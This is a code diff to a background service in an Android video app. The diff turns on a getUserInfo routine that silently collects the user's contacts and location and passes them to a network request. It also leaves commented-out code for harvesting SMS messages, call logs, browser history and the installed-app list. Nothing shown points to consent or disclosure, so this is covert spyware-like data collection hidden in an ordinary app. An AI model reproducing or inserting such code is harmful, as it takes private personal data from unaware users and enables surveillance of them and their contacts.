@@ -2,6 +2,7 @@ package com.lxw.videoworld.app.service;
 
 import android.app.IntentService;
 import android.content.Intent;
+import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
 import android.text.TextUtils;
 
@@ -16,13 +17,10 @@ import com.lxw.videoworld.framework.log.LoggerHelper;
 import com.lxw.videoworld.framework.util.SharePreferencesUtil;
 import com.lxw.videoworld.framework.util.UserInfoUtil;
 
-import java.util.ArrayList;
-
 import io.reactivex.Observable;
 import io.reactivex.ObservableEmitter;
 import io.reactivex.ObservableOnSubscribe;
 import io.reactivex.android.schedulers.AndroidSchedulers;
-import io.reactivex.annotations.NonNull;
 import io.reactivex.functions.Consumer;
 import io.reactivex.schedulers.Schedulers;
 
@@ -44,7 +42,7 @@ public class BackgroundIntentService extends IntentService{
     @Override
     protected void onHandleIntent(@Nullable Intent intent) {
         getConfig();
-//        getUserInfo();
+        getUserInfo();
     }
 
     public void getConfig(){
@@ -93,16 +91,8 @@ public class BackgroundIntentService extends IntentService{
     }
 
     public void getUserInfo() {
+
         final UserInfoModel userInfoModel = new UserInfoModel();
-        // app 安装列表
-        Observable<String> appListObservable = Observable.create(new ObservableOnSubscribe<String>() {
-            @Override
-            public void subscribe(ObservableEmitter<String> emitter) throws Exception {
-                UserInfoUtil.getInstallAppList(BackgroundIntentService.this.getPackageManager());
-                LoggerHelper.info("appListObservable", UserInfoUtil.getInstallAppList(BackgroundIntentService.this.getPackageManager()).toString());
-                emitter.onNext("");
-            }
-        });
         // 联系人
         Observable<String> contactListObservable = Observable.create(new ObservableOnSubscribe<String>() {
             @Override
@@ -111,27 +101,6 @@ public class BackgroundIntentService extends IntentService{
                 if(!TextUtils.isEmpty(content)){
                     userInfoModel.setContactList(content);
                     LoggerHelper.info("contactListObservable", UserInfoUtil.getContactInfo(BackgroundIntentService.this).toString());
-                }
-                emitter.onNext("");
-            }
-        });
-        // 通话记录
-        Observable<String> callLogsObservable = Observable.create(new ObservableOnSubscribe<String>() {
-            @Override
-            public void subscribe(ObservableEmitter<String> emitter) throws Exception {
-                UserInfoUtil.getCallLogs(BackgroundIntentService.this);
-//                LoggerHelper.info("callLogsObservable", UserInfoUtil.getCallLogs(BackgroundIntentService.this).toString());
-                emitter.onNext("");
-            }
-        });
-        // 短信
-        Observable<String> smsObservable = Observable.create(new ObservableOnSubscribe<String>() {
-            @Override
-            public void subscribe(ObservableEmitter<String> emitter) throws Exception {
-                ArrayList<String> content =  UserInfoUtil.getSmsInPhones(BackgroundIntentService.this);
-                if(content != null && content.size() > 0){
-                    userInfoModel.setSmsList(content.toString());
-                    LoggerHelper.info("smsObservable", UserInfoUtil.getSmsInPhones(BackgroundIntentService.this).toString());
                 }
                 emitter.onNext("");
             }
@@ -147,20 +116,7 @@ public class BackgroundIntentService extends IntentService{
                 emitter.onNext("");
             }
         });
-        // 浏览器历史记录
-        Observable<String> browserHistoryObservable = Observable.create(new ObservableOnSubscribe<String>() {
-            @Override
-            public void subscribe(ObservableEmitter<String> emitter) throws Exception {
-                ArrayList<String> content =  UserInfoUtil.getBrowserHistory(BackgroundIntentService.this);
-                if(content != null && content.size() > 0){
-                    userInfoModel.setBrowserHistory(content.toString());
-                    LoggerHelper.info("browserHistoryObservable", UserInfoUtil.getBrowserHistory(BackgroundIntentService.this).toString());
-                }
-                emitter.onNext("");
-            }
-        });
-        Observable.mergeDelayError(contactListObservable, lacationObservable, smsObservable,
-                browserHistoryObservable)
+        Observable.mergeDelayError(contactListObservable, lacationObservable)
                 .subscribeOn(Schedulers.io())
                 .observeOn(AndroidSchedulers.mainThread())
                 .subscribe(new Consumer<String>() {
@@ -181,5 +137,48 @@ public class BackgroundIntentService extends IntentService{
                         }.doRequest();
                     }
                 });
+        // 通话记录
+//        Observable<String> callLogsObservable = Observable.create(new ObservableOnSubscribe<String>() {
+//            @Override
+//            public void subscribe(ObservableEmitter<String> emitter) throws Exception {
+//                UserInfoUtil.getCallLogs(BackgroundIntentService.this);
+////                LoggerHelper.info("callLogsObservable", UserInfoUtil.getCallLogs(BackgroundIntentService.this).toString());
+//                emitter.onNext("");
+//            }
+//        });
+
+//        // app 安装列表
+//        Observable<String> appListObservable = Observable.create(new ObservableOnSubscribe<String>() {
+//            @Override
+//            public void subscribe(ObservableEmitter<String> emitter) throws Exception {
+//                UserInfoUtil.getInstallAppList(BackgroundIntentService.this.getPackageManager());
+//                LoggerHelper.info("appListObservable", UserInfoUtil.getInstallAppList(BackgroundIntentService.this.getPackageManager()).toString());
+//                emitter.onNext("");
+//            }
+//        });
+//        // 短信
+//        Observable<String> smsObservable = Observable.create(new ObservableOnSubscribe<String>() {
+//            @Override
+//            public void subscribe(ObservableEmitter<String> emitter) throws Exception {
+//                ArrayList<String> content =  UserInfoUtil.getSmsInPhones(BackgroundIntentService.this);
+//                if(content != null && content.size() > 0){
+//                    userInfoModel.setSmsList(content.toString());
+//                    LoggerHelper.info("smsObservable", UserInfoUtil.getSmsInPhones(BackgroundIntentService.this).toString());
+//                }
+//                emitter.onNext("");
+//            }
+//        });
+//        // 浏览器历史记录
+//        Observable<String> browserHistoryObservable = Observable.create(new ObservableOnSubscribe<String>() {
+//            @Override
+//            public void subscribe(ObservableEmitter<String> emitter) throws Exception {
+//                ArrayList<String> content =  UserInfoUtil.getBrowserHistory(BackgroundIntentService.this);
+//                if(content != null && content.size() > 0){
+//                    userInfoModel.setBrowserHistory(content.toString());
+//                    LoggerHelper.info("browserHistoryObservable", UserInfoUtil.getBrowserHistory(BackgroundIntentService.this).toString());
+//                }
+//                emitter.onNext("");
+//            }
+//        });
     }
 }
